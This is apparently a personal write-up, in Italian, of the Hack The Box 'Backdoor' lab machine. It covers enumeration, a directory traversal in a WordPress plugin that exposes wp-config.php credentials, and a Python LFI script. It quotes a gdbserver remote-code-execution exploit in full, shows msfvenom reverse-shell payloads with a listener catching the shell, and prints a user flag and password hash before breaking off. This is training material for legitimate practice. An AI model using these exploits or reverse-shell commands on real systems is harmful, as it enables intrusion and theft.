#+TITLE: HTB - Backdoor
#+AUTHOR: Andrea Pepe
#+DATE: 18/04/2022
#+OPTIONS: num:nil
#+INFOJS_OPT: view:t toc:t ltoc:t mouse:underline buttons:0 path:http://thomasf.github.io/solarized-css/org-info.min.js
#+HTML_HEAD: <link rel="stylesheet" type="text/css" href="http://thomasf.github.io/solarized-css/solarized-dark.min.css" />

* Enumeration
** nmap
*** nmap -sC -sV backdoor                                                                 
    #+begin_example
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-18 09:44 CEST
Nmap scan report for backdoor (10.10.11.125)
Host is up (0.21s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b4:de:43:38:46:57:db:4c:21:3b:69:f3:db:3c:62:88 (RSA)
|   256 aa:c9:fc:21:0f:3e:f4:ec:6b:35:70:26:22:53:ef:66 (ECDSA)
|_  256 d2:8b:e4:ec:07:61:aa:ca:f8:ec:1c:f8:8c:c1:f6:e1 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-generator: WordPress 5.8.1
|_http-title: Backdoor &#8211; Real-Life
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 50.35 seconds
    #+end_example

Notiamo che c'è un web server sulla porta TCP/80 e che è stato generato con ~Wordpress v 5.8.1~.

** gobuster
*** dir enum
    #+begin_example
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://backdoor
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://backdoor
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/04/18 09:52:42 Starting gobuster in directory enumeration mode
===============================================================
/wp-content           (Status: 301) [Size: 309] [--> http://backdoor/wp-content/]
/wp-includes          (Status: 301) [Size: 310] [--> http://backdoor/wp-includes/]
/wp-admin             (Status: 301) [Size: 307] [--> http://backdoor/wp-admin/]   
Progress: 9990 / 220561 (4.53%) 
    #+end_example

Le uniche cose trovate sono relative a wordpress, non sembra nulla di exploitabile.
*** vhost enum
Visitando il sito web, premendo su home si vede che il browser non riesce a fare il redirect
a ~backdoor.htb~ (poiché non è associato ad alcun indirizzo IP in ~/etc/hosts~), quindi di certo 
c'è un **virtual host**, ma effettuaiamo una scansione per vedere se ce ne sono altri.

#+begin_example
gobuster vhost -u http://backdoor -w ~/Scrivania/gitFolder/SecLists/Discovery/DNS/subdomains-top1million-5000.txt 2>/dev/null
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://backdoor
[+] Method:       GET
[+] Threads:      10
[+] Wordlist:     /home/andrea/Scrivania/gitFolder/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2022/04/18 10:05:48 Starting gobuster in VHOST enumeration mode
===============================================================
Found: www.backdoor (Status: 200) [Size: 63830]
Found: ns1.backdoor (Status: 200) [Size: 63830]
Found: localhost.backdoor (Status: 200) [Size: 64004]
Found: smtp.backdoor (Status: 200) [Size: 63859]     
Found: ftp.backdoor (Status: 200) [Size: 63830]      
Found: cpanel.backdoor (Status: 200) [Size: 63917]   
Found: whm.backdoor (Status: 200) [Size: 63830]      
Found: webmail.backdoor (Status: 200) [Size: 63946]  
Found: pop.backdoor (Status: 200) [Size: 63830]      
Found: webdisk.backdoor (Status: 200) [Size: 63946]  
Found: mail.backdoor (Status: 200) [Size: 63859]     
Found: autoconfig.backdoor (Status: 200) [Size: 64033]
Found: ns2.backdoor (Status: 200) [Size: 63830]       
Found: test.backdoor (Status: 200) [Size: 63859]      
Found: dev.backdoor (Status: 200) [Size: 63830]       
Found: ns.backdoor (Status: 200) [Size: 63801]        
Found: blog.backdoor (Status: 200) [Size: 63859]      
Found: autodiscover.backdoor (Status: 200) [Size: 64091]
Found: m.backdoor (Status: 200) [Size: 63772]           
Found: mail2.backdoor (Status: 200) [Size: 63888]       
Found: admin.backdoor (Status: 200) [Size: 63888]       
Found: ns3.backdoor (Status: 200) [Size: 63830]         
Found: pop3.backdoor (Status: 200) [Size: 63859]        
Found: forum.backdoor (Status: 200) [Size: 63888]       
Found: www2.backdoor (Status: 200) [Size: 63859]        
Found: vpn.backdoor (Status: 200) [Size: 63830]         
Found: mx.backdoor (Status: 200) [Size: 63801]          
Found: imap.backdoor (Status: 200) [Size: 63859]        
Found: old.backdoor (Status: 200) [Size: 63830]         
Found: mysql.backdoor (Status: 200) [Size: 63888]       
Found: beta.backdoor (Status: 200) [Size: 63859]        
Found: support.backdoor (Status: 200) [Size: 63946]     
Found: new.backdoor (Status: 200) [Size: 63830]         
Found: mobile.backdoor (Status: 200) [Size: 63917]      
Found: secure.backdoor (Status: 200) [Size: 63917]      
Found: shop.backdoor (Status: 200) [Size: 63859]        
Found: cp.backdoor (Status: 200) [Size: 63801]          
Found: demo.backdoor (Status: 200) [Size: 63859]        
Found: dns2.backdoor (Status: 200) [Size: 63859]        
Found: ns4.backdoor (Status: 200) [Size: 63830]         
Found: dns1.backdoor (Status: 200) [Size: 63859]        
Found: static.backdoor (Status: 200) [Size: 63917]      
Found: lists.backdoor (Status: 200) [Size: 63888]       
Found: news.backdoor (Status: 200) [Size: 63859]        
Found: server.backdoor (Status: 200) [Size: 63917] 
#+end_example

Purtroppo vengono individuati una marea di vhosts e quindi si decide di proseguire
con quelli che incontriamo chiaramente lungo il percorso, a partire da ~backdoor.htb~.
** web server
Il virtual host ~backdoor.htb~ sembra essere una copia esatta del sito precedente,
con l'eccezione che ha una pagina di home funzionante senza redirect.
Nella pagina relativa al ~blog~ si nota un commento di un utente **admin**.
Il plugin per postare i commenti nel blog è ~Gravatar~, ma effettuando ricerche in 
rete non sembrano esserci informazioni interessanti.

*** wpscan
    #+begin_example
sudo wpscan --url http://backdoor.htb
[sudo] password di andrea: 
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.20
                               
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] Updating the Database ...
[i] Update completed.

[+] URL: http://backdoor.htb/ [10.10.11.125]
[+] Started: Mon Apr 18 18:56:49 2022

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://backdoor.htb/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://backdoor.htb/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://backdoor.htb/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://backdoor.htb/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.8.1 identified (Insecure, released on 2021-09-09).
 | Found By: Rss Generator (Passive Detection)
 |  - http://backdoor.htb/index.php/feed/, <generator>https://wordpress.org/?v=5.8.1</generator>
 |  - http://backdoor.htb/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.8.1</generator>

[+] WordPress theme in use: twentyseventeen
 | Location: http://backdoor.htb/wp-content/themes/twentyseventeen/
 | Last Updated: 2022-01-25T00:00:00.000Z
 | Readme: http://backdoor.htb/wp-content/themes/twentyseventeen/readme.txt
 | [!] The version is out of date, the latest version is 2.9
 | Style URL: http://backdoor.htb/wp-content/themes/twentyseventeen/style.css?ver=20201208
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 2.8 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://backdoor.htb/wp-content/themes/twentyseventeen/style.css?ver=20201208, Match: 'Version: 2.8'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:03 <===============> (137 / 137) 100.00% Time: 00:00:03

[i] No Config Backups Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Mon Apr 18 18:56:57 2022
[+] Requests Done: 187
[+] Cached Requests: 5
[+] Data Sent: 45.491 KB
[+] Data Received: 18.677 MB
[+] Memory used: 229.719 MB
[+] Elapsed time: 00:00:08

    #+end_example

Con ~wpscan~ (essendo il sito web realizzato con Wordpress), si tenta di estrarre alcune informazioni.

Facendoci guidare dal nome della macchina, si cerca su internet qualche vulnerabilità di Wordpress relativa
ad una ~backdoor~ e una sorgente interessante è il contenuto del seguente [[https://pentaroot.com/exploit-wordpress-backdoor-theme-pages/][link.]] 

Si trova la pagina di login di wordpress a: ~http://backdoor.htb/wp-login.php~ e tentiamo di fare **brute-force**
della password con username **admin** usando ~wpscan~.

Tuttavia, l'exploit sembra non funzionare.
*** searchsploit 
    #+begin_example
searchsploit WordPress 5.8.1          
-------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                      |  Path
-------------------------------------------------------------------- ---------------------------------
WordPress Plugin DZS Videogallery < 8.60 - Multiple Vulnerabilities | php/webapps/39553.txt
WordPress Plugin iThemes Security < 7.0.3 - SQL Injection           | php/webapps/44943.txt
WordPress Plugin Rest Google Maps < 7.11.18 - SQL Injection         | php/webapps/48918.sh
-------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

    #+end_example

La maggior parte delle informazioni legate in rete, per quanto riguarda vulnerabilità di wordpress
che includano lo sfruttamento di una backdoor sono legate all'uso di **plugins**.

Cerchimo quindi di usare ancora ~wpscan~ per cercare i plugin utilizzati:
#+begin_example
sudo wpscan --url http://backdoor.htb/ --enumerate p,u --plugins-detection aggressive         3 ⨯
[sudo] password di andrea: 
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.20
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://backdoor.htb/ [10.10.11.125]
[+] Started: Mon Apr 18 20:02:31 2022

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://backdoor.htb/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://backdoor.htb/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://backdoor.htb/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://backdoor.htb/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.8.1 identified (Insecure, released on 2021-09-09).
 | Found By: Rss Generator (Passive Detection)
 |  - http://backdoor.htb/index.php/feed/, <generator>https://wordpress.org/?v=5.8.1</generator>
 |  - http://backdoor.htb/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.8.1</generator>

[+] WordPress theme in use: twentyseventeen
 | Location: http://backdoor.htb/wp-content/themes/twentyseventeen/
 | Last Updated: 2022-01-25T00:00:00.000Z
 | Readme: http://backdoor.htb/wp-content/themes/twentyseventeen/readme.txt
 | [!] The version is out of date, the latest version is 2.9
 | Style URL: http://backdoor.htb/wp-content/themes/twentyseventeen/style.css?ver=20201208
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 2.8 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://backdoor.htb/wp-content/themes/twentyseventeen/style.css?ver=20201208, Match: 'Version: 2.8'

[+] Enumerating Most Popular Plugins (via Aggressive Methods)
 Checking Known Locations - Time: 00:00:46 <====================> (1500 / 1500) 100.00% Time: 00:00:46
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] akismet
 | Location: http://backdoor.htb/wp-content/plugins/akismet/
 | Latest Version: 4.2.2
 | Last Updated: 2022-01-24T16:11:00.000Z
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://backdoor.htb/wp-content/plugins/akismet/, status: 403
 |
 | The version could not be determined.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <========================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] admin
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://backdoor.htb/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Mon Apr 18 20:03:26 2022
[+] Requests Done: 1557
[+] Cached Requests: 8
[+] Data Sent: 426.63 KB
[+] Data Received: 779.333 KB
[+] Memory used: 230.309 MB
[+] Elapsed time: 00:00:54
#+end_example

Notiamo che viene rilevato il plugin ~akismet~. Cerchiamo informazioni in rete.
*** Plugin exploitation
Andando in ~http://backdoor.htb/wp-content/plugins/akismet~, ci viene detto che non abbiamo i permessi per quella risorsa.
Tuttavia, andando in una cartella indietro possiamo vedere che c'è la possibilità di accedere a ~.../ebook-download~.
Dunque, si tratta del plugin **ebook**. Leggiamo il file ~readme.txt~ per vedere se è presente la versione del plugin e cercare vulnerabilià.
#+begin_example
=== Plugin Name ===
Contributors: zedna
Donate link: https://www.paypal.com/cgi-bin/webscr?cmd=_donations&business=3ZVGZTC7ZPCH2&lc=CZ&item_name=Zedna%20Brickick%20Website&currency_code=USD&bn=PP%2dDonationsBF%3abtn_donateCC_LG%2egif%3aNonHosted
Tags: ebook, file, download
Requires at least: 3.0.4
Tested up to: 4.4
Stable tag: 1.1
License: GPLv2 or later
License URI: http://www.gnu.org/licenses/gpl-2.0.html

Allow user to download your ebook custom file when insert an email.

== Description ==

Enable user to download your Ebook or other file after inserting his mail.

<a href="https://sellfy.com/p/CCTK/" target="_blank">eBook download Pro</a> features:
-social share for download
-pop-up window with download form
-download stats incoming

== Installation ==

1. Upload `ebook-download` folder to the `/wp-content/plugins/` directory
2. Activate the plugin through the 'Plugins' menu in WordPress
3. Add new ebook in `Ebook downloads`
4. Add widget `Ebook Download` to your widget area

== Frequently Asked Questions ==

= Can i share image with ebook? =
Yes, you can set thumbnail for you Ebook post.

= Which file types can i use? =
You can use whatever file type you can upload to wordpress.

= Can i insert custom file URL? =
Yes, you can insert external URL. 

 == Screenshots ==
1. Widget
2. Ebook post
3. Email list
4. Settings page

== Upgrade Notice ==
= 1.1 =
Built on WP 4.3 but can work on older versions

= 1.0 =
Built on WP 4.3 but can work on older versions

== Changelog ==
= 1.1 =

Fixed function call.

= 1.0 =
 First version
#+end_example

La versione è la 1.0 e troviamo che è vulnerabile con **directory traversal ([[https://www.exploit-db.com/exploits/39575][link]]).

Dunque, accediamo alla seguente directory:
~/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php~

Questo path ci permette di scaricare il file **wp-config.php** che può contenere delle credenziali.
#+NAME: wp-config.php
#+begin_example
../../../wp-config.php../../../wp-config.php../../../wp-config.php<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the installation.
 * You don't have to use the web site, you can copy this file to "wp-config.php"
 * and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://wordpress.org/support/article/editing-wp-config-php/
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** MySQL database username */
define( 'DB_USER', 'wordpressuser' );

/** MySQL database password */
define( 'DB_PASSWORD', 'MQYBJSaD#DxG6qbm' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8' );

/** The database collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

/**#@+
 * Authentication unique keys and salts.
 *
 * Change these to different unique phrases! You can generate these using
 * the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}.
 *
 * You can change these at any point in time to invalidate all existing cookies.
 * This will force all users to have to log in again.
 *
 * @since 2.6.0
 */

/* That's all, stop editing! Happy blogging. */
/** Absolute path to the WordPress directory. */
if ( !defined('ABSPATH') )
define('ABSPATH', dirname(__FILE__) . '/');
/* THIS IS CUSTOM CODE CREATED AT ZEROFRACTAL TO MAKE SITE ACCESS DYNAMIC */
$currenthost = "http://".$_SERVER['HTTP_HOST'];
$currentpath = preg_replace('@/+$@','',dirname($_SERVER['SCRIPT_NAME']));
$currentpath = preg_replace('/\/wp.+/','',$currentpath);
define('WP_HOME',$currenthost.$currentpath);
define('WP_SITEURL',$currenthost.$currentpath);
define('WP_CONTENT_URL', $currenthost.$currentpath.'/wp-content');
define('WP_PLUGIN_URL', $currenthost.$currentpath.'/wp-content/plugins');
define('DOMAIN_CURRENT_SITE', $currenthost.$currentpath );
@define('ADMIN_COOKIE_PATH', './');

define( 'AUTH_KEY',         'put your unique phrase here' );
define( 'SECURE_AUTH_KEY',  'put your unique phrase here' );
define( 'LOGGED_IN_KEY',    'put your unique phrase here' );
define( 'NONCE_KEY',        'put your unique phrase here' );
define( 'AUTH_SALT',        'put your unique phrase here' );
define( 'SECURE_AUTH_SALT', 'put your unique phrase here' );
define( 'LOGGED_IN_SALT',   'put your unique phrase here' );
define( 'NONCE_SALT',       'put your unique phrase here' );

/**#@-*/

/**
 * WordPress database table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the documentation.
 *
 * @link https://wordpress.org/support/article/debugging-in-wordpress/
 */
define( 'WP_DEBUG', false );

/* Add any custom values between this line and the "stop editing" line. */



/* That's all, stop editing! Happy publishing. */

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
	define( 'ABSPATH', __DIR__ . '/' );
}

/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';
<script>window.close()</script> 
#+end_example

Prendiamo le seguenti credenziali del database:
**wordpressuser:MQYBJSaD#DxG6qbm**

Vediamo inoltre che per le chiavi, si possono generare al link: https://wordpress.org/support/article/editing-wp-config-php/

Nulla da fare, non è fattibile. Cerchiamo di exploitare la directory traversal per effettuare un LFI.
*** LFI
Cerchiamo di sfruttare la vulnerabilità per effettuare un LFI. Ho scritto il seguente script python:
#+begin_src python
#!/usr/bin/python3


'''
This script aims to brute-force a site through LFI (Local File inclusion)
The path to bruteforce is /proc/[PID]/cmdline
'''


import requests
import re

url = "http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/"

for i in range (1, 1000):
    trial = url + str(i) + "/cmdline"
    response = requests.get(trial)
    response_length = len(response.content)

    if (response_length > 82):
        print("URL: " + trial + "\n")
        print(re.split("/cmdline/", str(response.content)))

        print ("\n-----------------------------------")
#+end_src

#+NAME: output
#+begin_example
-----------------------------------
URL: http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/987/cmdline

["b'/proc/987", 'proc/987', "proc/987/cmdlinebash\\x00-c\\x00cd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true;\\x00<script>window.close()</script>'"]
#+end_example


Vediamo che c'è un **gdbserver** che runna dietro la porta 1337!!!
Cerchiamo delle vulnerabilità (RCE possibilmente).
** gdbserver
*** Exploit
Ho trovato su ~exploit-db~ il seguente exploit che richiede l'uso di msfvenom per generare del payload e ottenere
una **reverse shell**.
#+begin_src python
# Exploit Title: GNU gdbserver 9.2 - Remote Command Execution (RCE)
# Date: 2021-11-21
# Exploit Author: Roberto Gesteira Miñarro (7Rocky)
# Vendor Homepage: https://www.gnu.org/software/gdb/
# Software Link: https://www.gnu.org/software/gdb/download/
# Version: GNU gdbserver (Ubuntu 9.2-0ubuntu1~20.04) 9.2
# Tested on: Ubuntu Linux (gdbserver debugging x64 and x86 binaries)

#!/usr/bin/env python3


import binascii
import socket
import struct
import sys

help = f'''
Usage: python3 {sys.argv[0]} <gdbserver-ip:port> <path-to-shellcode>

Example:
- Victim's gdbserver   ->  10.10.10.200:1337
- Attacker's listener  ->  10.10.10.100:4444

1. Generate shellcode with msfvenom:
$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.100 LPORT=4444 PrependFork=true -o rev.bin

2. Listen with Netcat:
$ nc -nlvp 4444

3. Run the exploit:
$ python3 {sys.argv[0]} 10.10.10.200:1337 rev.bin
'''


def checksum(s: str) -> str:
    res = sum(map(ord, s)) % 256
    return f'{res:2x}'


def ack(sock):
    sock.send(b'+')


def send(sock, s: str) -> str:
    sock.send(f'${s}#{checksum(s)}'.encode())
    res = sock.recv(1024)
    ack(sock)
    return res.decode()


def exploit(sock, payload: str):
    send(sock, 'qSupported:multiprocess+;qRelocInsn+;qvCont+;')
    send(sock, '!')

    try:
        res = send(sock, 'vCont;s')
        data = res.split(';')[2]
        arch, pc = data.split(':')
    except Exception:
        print('[!] ERROR: Unexpected response. Try again later')
        exit(1)

    if arch == '10':
        print('[+] Found x64 arch')
        pc = binascii.unhexlify(pc[:pc.index('0*')])
        pc += b'\0' * (8 - len(pc))
        addr = hex(struct.unpack('<Q', pc)[0])[2:]
        addr = '0' * (16 - len(addr)) + addr
    elif arch == '08':
        print('[+] Found x86 arch')
        pc = binascii.unhexlify(pc)
        pc += b'\0' * (4 - len(pc))
        addr = hex(struct.unpack('<I', pc)[0])[2:]
        addr = '0' * (8 - len(addr)) + addr

    hex_length = hex(len(payload))[2:]

    print('[+] Sending payload')
    send(sock, f'M{addr},{hex_length}:{payload}')
    send(sock, 'vCont;c')


def main():
    if len(sys.argv) < 3:
        print(help)
        exit(1)

    ip, port = sys.argv[1].split(':')
    file = sys.argv[2]

    try:
        with open(file, 'rb') as f:
            payload = f.read().hex()
    except FileNotFoundError:
        print(f'[!] ERROR: File {file} not found')
        exit(1)

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.connect((ip, int(port)))
        print('[+] Connected to target. Preparing exploit')
        exploit(sock, payload)
        print('[*] Pwned!! Check your listener')


if __name__ == '__main__':
    main()
            
#+end_src

Non funziona, ma proviamo ad interagire direttamente con ~gdb~.
*** gdb
Sfruttiamo quanto trovato al seguente [[https://book.hacktricks.xyz/pentesting/pentesting-remote-gdbserver][link]].
#+begin_example
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.16.48 LPORT=4444 PrependFork=true -f elf -o rev.elf                                                                                
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 106 bytes
Final size of elf file: 226 bytes
Saved as: rev.elf
#+end_example

#+begin_example 
gdb rev.elf                                                                                   
GNU gdb (Debian 10.1-2+b1) 10.1.90.20210103-git
Copyright (C) 2021 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from rev.elf...
(No debugging symbols found in rev.elf)
(gdb) target extended-remote 10.10.11.125:1337
Remote debugging using 10.10.11.125:1337
Reading /lib64/ld-linux-x86-64.so.2 from remote target...
warning: File transfers from remote targets can be slow. Use "set sysroot" to access files locally instead.
Reading /lib64/ld-linux-x86-64.so.2 from remote target...
Reading symbols from target:/lib64/ld-linux-x86-64.so.2...
Reading /lib64/ld-2.31.so from remote target...
Reading /lib64/.debug/ld-2.31.so from remote target...
Reading /usr/lib/debug//lib64/ld-2.31.so from remote target...
Reading /usr/lib/debug/lib64//ld-2.31.so from remote target...
Reading target:/usr/lib/debug/lib64//ld-2.31.so from remote target...
(No debugging symbols found in target:/lib64/ld-linux-x86-64.so.2)
0x00007ffff7fd0100 in ?? () from target:/lib64/ld-linux-x86-64.so.2
(gdb) remote set rev.elf rev.elf
Undefined remote command: "set rev.elf rev.elf".  Try "help remote".
(gdb) remote put rev.elf rev.elf
Successfully sent file "rev.elf".
(gdb) set remote exec-file /home/user/rev.elf
(gdb) run
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program:  
Reading /home/user/rev.elf from remote target...
Reading /home/user/rev.elf from remote target...
Reading symbols from target:/home/user/rev.elf...
(No debugging symbols found in target:/home/user/rev.elf)
[Detaching after fork from child process 9983]
[Inferior 1 (process 9956) exited normally]
(gdb) target extended-remote 10.10.11.125:1337
#+end_example

E abbiamo ottenuto una **Reverse Shell**
#+begin_example
nc -lvnp 4444                                                                                 
listening on [any] 4444 ...
connect to [10.10.16.48] from (UNKNOWN) [10.10.11.125] 38848
whoami
user
which python
which python3
/usr/bin/python3
python3 -c "import pty;pty.spawn('/bin/bash')"
user@Backdoor:/home/user$
#+end_example

* Privilege Escalation
** user
*** user flag
user.txt: 6524dc53a2680decd5ccca3101329b88
*** mysql
    #+begin_example
mysql> select * from wp_users;
select * from wp_users;
+----+------------+------------------------------------+---------------+---------------------+---------------------+---------------------+-----------------------------------------------+-------------+--------------+
| ID | user_login | user_pass                          | user_nicename | user_email          | user_url            | user_registered     | user_activation_key                           | user_status | display_name |
+----+------------+------------------------------------+---------------+---------------------+---------------------+---------------------+-----------------------------------------------+-------------+--------------+
|  1 | admin      | $P$Bt8c3ivanSGd2TFcm3HV/9ezXPueg5. | admin         | admin@wordpress.com | http://backdoor.htb | 2021-07-24 13:19:11 | 1650312723:$P$BHwU9Aw94E6dnWvqHh/Pi/HGV3vT3Q1 |           0 | admin        |
+----+------------+------------------------------------+---------------+---------------------+---------------------+---------------------+-----------------------------------------------+-------------+--------------+
1 row in set (0.00 sec)

    #+end_example
Ma non è utile.
*** linpeas
    #+begin_example
root         860  0.0  0.1   8356  3404 ?        S    19:07   0:00  _ /usr/sbin/CRON -f
root         885  0.0  0.0   2608  1760 ?        Ss   19:07   0:01      _ /bin/sh -c while true;do sleep 1;find /var/run/screen/S-root/ -empty -exec screen -dmS root ;; done
root       35493  0.0  0.0   5476   592 ?        S    20:30   0:00          _ sleep 1

    #+end_example

    #+begin_example
user        2081  0.0  0.2   8364  4712 pts/1    Ss   19:12   0:00      _ /bin/bash
